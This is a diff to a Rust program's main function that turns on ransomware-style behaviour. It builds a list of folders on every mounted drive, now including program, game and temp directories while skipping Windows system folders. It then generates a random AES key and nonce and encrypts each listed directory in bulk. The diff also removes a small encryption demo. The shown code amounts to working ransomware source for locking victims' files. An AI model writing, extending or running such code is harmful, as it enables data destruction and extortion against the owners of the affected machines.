@@ -16,43 +16,27 @@ use std::path;
 use std::str;
 use sysinfo::{NetworkExt, NetworksExt, ProcessExt, RefreshKind, System, SystemExt};
 use walkdir::WalkDir;
+mod smart_dir_list;
 
 fn main() {
-    let msg = "This is my encrypted text!";
-
-    let mut rng = Hc128Rng::from_entropy();
-    let mut key_bytes: [u8; 16] = [0; 16];
-    let mut nonce_bytes: [u8; 12] = [0; 12];
-    rng.fill_bytes(&mut key_bytes);
-    rng.fill_bytes(&mut nonce_bytes);
-
-    let key = Key::from_slice(&key_bytes);
-    let cipher = Aes128GcmSiv::new(key);
-    let nonce = Nonce::from_slice(&nonce_bytes);
-
-    let cipher_text = cipher.encrypt(&nonce, msg.as_ref()).expect("error");
-
-    let plain_text = cipher.decrypt(&nonce, cipher_text.as_ref()).expect("error");
-
-    for x in cipher_text {
-        print!("{}", x);
-    }
-
-    println!("\n{}", str::from_utf8(&plain_text).expect("test"))
-    /*
     let mut common_folder_paths = Vec::new();
+
     add_common_folder_paths_windows(&mut common_folder_paths);
 
     for mountpath in mountpoints::mountpaths().expect("Failed to get list!") {
         add_possible_important_folders_on_drive(&mountpath, &mut common_folder_paths);
     }
 
+    for mountpath in mountpoints::mountpaths().expect("Failed to get list!") {
+        add_non_important_folders_on_drive(&mountpath, &mut common_folder_paths);
+    }
+
     let mut key_gen = key_gen::KeyGen::from(Hc128Rng::from_entropy());
 
-    let key_bytes = key_gen.gen_key_bytes();
+    let key_bytes = key_gen.gen_key_bytes_128bits();
     let nonce_bytes = key_gen.gen_nonce_bytes();
 
-    let encryptor = encryptor::Encryptor::from(key_bytes, nonce_bytes);
+    let encryptor = encryptor::Encryptor128bit::from(key_bytes, nonce_bytes);
 
     for path in common_folder_paths {
         encryptor.encrypt_dir(&path);
@@ -90,7 +74,7 @@ fn main() {
     let sys = System::new_all();
     for disk in sys.disks() {
         println!("{:?}", disk);
-    }*/*/
+    }*/
 }
 
 fn add_common_folder_paths_windows(vec: &mut Vec<String>) {
@@ -286,6 +270,60 @@ fn add_possible_important_folders_on_drive(drive_mount_path: &String, vec: &mut 
             if not_wanted_dirs.contains(path_split.last().unwrap()) {
                 continue;
             } else if !not_important_dirs.contains(path_split.last().unwrap()) {
+                vec.push(path);
+            }
+        }
+    }
+}
+
+fn add_non_important_folders_on_drive(drive_mount_path: &String, vec: &mut Vec<String>) {
+    let not_important_dirs = vec![
+        "Microsoft",
+        "PerfLogs",
+        "Program Files",
+        "Program Files (x86)",
+        "ProgramData",
+        "Recovery",
+        //"System Volume Information",
+        //"Users",
+        //"Windows",
+        "Portable Apps",
+        "cygwin64",
+        "MinGW",
+        "Temp",
+        "temp",
+        "Android",
+        "Games",
+        "Steam",
+        "SteamLibrary",
+        "Origin",
+        "OriginGames",
+        "EpicGames",
+        "Epic Games",
+        "GOG",
+        "GOG Games",
+        "Battle.net",
+    ];
+
+    let not_wanted_dirs = vec!["System Volume Information", "Users", "Windows"];
+
+    let drive_dirs = match fs::read_dir(drive_mount_path) {
+        Ok(dirs) => dirs,
+        Err(_) => return,
+    };
+
+    for path in drive_dirs {
+        let path = match path {
+            Ok(p) => p.path(),
+            Err(_) => continue,
+        };
+
+        if path.is_dir() {
+            let path = path.display().to_string();
+            let path_split: Vec<&str> = path.split("\\").collect();
+            if not_wanted_dirs.contains(path_split.last().unwrap()) {
+                continue;
+            } else if not_important_dirs.contains(path_split.last().unwrap()) {
                 vec.push(path);
             }
         }
